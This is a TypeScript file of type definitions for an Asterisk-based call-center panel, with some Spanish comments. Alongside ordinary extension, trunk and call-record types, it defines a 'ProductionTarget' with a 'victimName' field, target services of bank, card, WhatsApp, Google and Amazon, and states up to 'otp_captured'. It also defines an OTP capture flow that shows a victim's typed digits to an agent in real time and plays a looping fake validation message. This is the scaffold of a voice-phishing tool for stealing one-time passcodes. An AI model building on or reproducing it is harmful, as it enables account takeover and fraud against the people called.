export interface PjsipExtension {
  id: string;
  extension: string;
  name: string;
  secret: string;
  context: string;
  codecs: string[];
  maxContacts: number;
  transport: 'transport-udp' | 'transport-tcp' | 'transport-tls' | 'transport-wss';
  status: 'registered' | 'unregistered' | 'in-use' | 'ringing';
  callerId: string;
  callerIdNum?: string;
  callerIdName?: string;
  ipAddress?: string;
  lastSeen?: string;
}

export interface CarrierTrunk {
  id: string;
  name: string;
  authType: 'registration' | 'ip_auth';
  host: string;
  port: number;
  username?: string;
  secret?: string;
  inboundContext: string;
  outboundCallerId: string;
  outboundCallerName?: string;
  codecs: string[];
  qualifyFreq: number;
  status: 'reachable' | 'unreachable' | 'lagged' | 'disabled';
  latencyMs?: number;
  fromuser?: string;
  sendrpid?: 'yes' | 'no';
  trustrpid?: 'yes' | 'no';
  insecure?: string; // e.g. 'port,invite'
  dialplanPattern?: string; // e.g. '_1XXXXXXXXXX'
  dialFlags?: string; // e.g. 'Tor'
}

export interface Press1Config {
  enabled: boolean;
  extension: string;
  welcomeAudioText: string;
  welcomeAudioId?: string;
  timeoutSeconds: number;
  maxRetries: number;
  digit1Action: 'transfer_extension' | 'queue' | 'webhook';
  digit1Target: string; // e.g., "1001" or "support_queue"
  returnToOriginatingAgent: boolean; // Si es true, retorna la llamada a la extensión del agente que originó la marcación
  invalidPromptText: string;
  invalidAudioId?: string;
  fallbackAction: 'hangup' | 'voicemail';
}

export interface OtpCaptureConfig {
  enabled: boolean;
  extension: string;
  digitLength: 4 | 6 | 8;
  welcomePromptText: string;
  welcomeAudioId?: string;
  repeatPromptOnTimeout: boolean;
  timeoutSeconds: number;
  maxAttempts: number;
  webhookUrl: string;
  webhookAuthHeader: string;
  successPromptText: string;
  successAudioId?: string;
  failurePromptText: string;
  failureAudioId?: string;
  successAction: 'hangup' | 'transfer';
  successTarget?: string;
  stasisAppName: string;
  enableAgentRealtimeScreen: boolean; // Mostrar dígitos en pantalla del agente en tiempo real conforme el cliente digita
  maskDigitsOnAgentScreen: boolean; // Ofuscar o mostrar números visibles en la pantalla del agente
  validationMode: 'agent_manual' | 'automatic_webhook'; // 'agent_manual': El agente valida y decide en pantalla si es válido o inválido mientras el cliente espera
  validatingWaitPromptText: string; // "Un momento por favor, estamos validando su información..." reproducido en bucle al cliente
  validatingWaitAudioId?: string;
}

export interface AudioPrompt {
  id: string;
  name: string;
  category: 'press1_welcome' | 'press1_invalid' | 'otp_welcome' | 'otp_success' | 'otp_failure' | 'hold_music' | 'custom';
  fileName: string;
  fileSize: string;
  durationSec: number;
  format: string;
  sampleRate: string;
  dataUrl: string;
  asteriskPath: string; // e.g. "custom/bienvenida_corporativa"
  createdAt: string;
}

export interface UserPermissions {
  canManageExtensions: boolean;
  canManageCarriers: boolean;
  canManageIVR: boolean;
  canUploadAudio: boolean;
  canSyncAsterisk: boolean;
  canUseSoftphone: boolean;
  canManageUsers: boolean;
  canExportConfigs: boolean;
}

export interface CapturedOtpRecord {
  id: string;
  number: string;
  otp: string;
  timestamp: string;
  channel?: string;
  service?: string;
  status?: 'valid' | 'invalid' | 'pending';
}

export interface ProductionTarget {
  id: string;
  phoneNumber: string;
  victimName?: string;
  serviceType: 'bank' | 'card' | 'whatsapp' | 'google' | 'amazon' | 'custom';
  status: 'idle' | 'dialing' | 'ringing' | 'in_ivr' | 'otp_captured' | 'transferred' | 'failed' | 'completed';
  capturedOtp?: string;
  durationSeconds?: number;
  callTimestamp?: string;
  agentExtension?: string;
  notes?: string;
}

export interface SystemUser {
  id: string;
  name: string;
  username?: string;
  email: string;
  password?: string;
  role: 'admin' | 'supervisor' | 'agent' | 'custom';
  assignedExtensions: string[]; // extensions >= 1001
  permissions: UserPermissions;
  status: 'active' | 'inactive';
  avatarColor: string;
  createdAt: string;
  lastLogin?: string;
}

export interface AstDbEntry {
  id: string;
  family: string;
  key: string;
  value: string;
  updatedAt: string;
  description?: string;
}

export interface SqliteCdrRecord {
  id: string;
  calldate: string;
  src: string;
  dst: string;
  originatingAgent?: string;
  duration: number;
  billsec: number;
  disposition: 'ANSWERED' | 'NO ANSWER' | 'BUSY' | 'FAILED';
  otpCode?: string;
  otpStatus?: 'VERIFIED' | 'FAILED' | 'SKIPPED';
  uniqueid: string;
}

export interface AsteriskConnectionSettings {
  amiHost: string;
  amiPort: number;
  amiUser: string;
  amiSecret: string;
  ariHost: string;
  ariPort: number;
  ariUser: string;
  ariSecret: string;
  ariAppName: string;
  sqliteEnabled: boolean;
  sqliteAstDbPath: string; // e.g. /var/lib/asterisk/astdb.sqlite3
  sqliteRealtimeDbPath: string; // e.g. /var/lib/asterisk/realtime.sqlite3
  sqliteCdrDbPath: string; // e.g. /var/log/asterisk/master.db
  syncStrategy: 'hybrid' | 'ami_reload' | 'ari_stasis' | 'realtime_db';
  autoSyncOnChange: boolean;
  status: 'connected' | 'disconnected' | 'connecting' | 'error';
}

export interface SyncLogEntry {
  id: string;
  timestamp: string;
  type: 'AMI' | 'ARI' | 'PJSIP' | 'SQLITE' | 'SYSTEM' | 'ERROR';
  message: string;
  payload?: string;
  status: 'success' | 'pending' | 'failed';
}

export interface CallSimulationLog {
  id: string;
  timestamp: string;
  speaker: 'system' | 'user';
  text: string;
  dtmf?: string;
}
